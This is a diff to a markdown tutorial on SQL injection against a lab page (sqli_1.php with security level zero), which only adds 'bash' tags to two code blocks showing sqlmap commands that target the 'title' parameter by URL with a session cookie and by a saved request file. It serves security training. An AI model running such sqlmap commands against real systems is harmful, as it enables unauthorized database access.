@@ -19,7 +19,7 @@ GET /sqli_1.php?title=joe&action=search HTTP/1.1
 
 
 6. To use SQLMap we can use the following command.
-```
+```bash
 sqlmap -u "http://<target-ip>/sqli_1.php?title=joe&action=search" --cookie "PHPSESSID=<cookie>; security_level=0" -p title 
 ```
 - In this command we are targeting the `title` parameter using the `-p` option.
@@ -49,7 +49,7 @@ sqlmap -u "http://<target-ip>/sqli_1.php?title=joe&action=search" --cookie "PHPS
 3. Save this POST request to a file using the `Copy to All` button in the `Action` menu. 
 
 4. Now we can use `sqlmap` on the request file we just saved.
-```
+```bash
 sqlmap -r <filename> -p title
 ```
 - We are targeting the `title` parameter. 
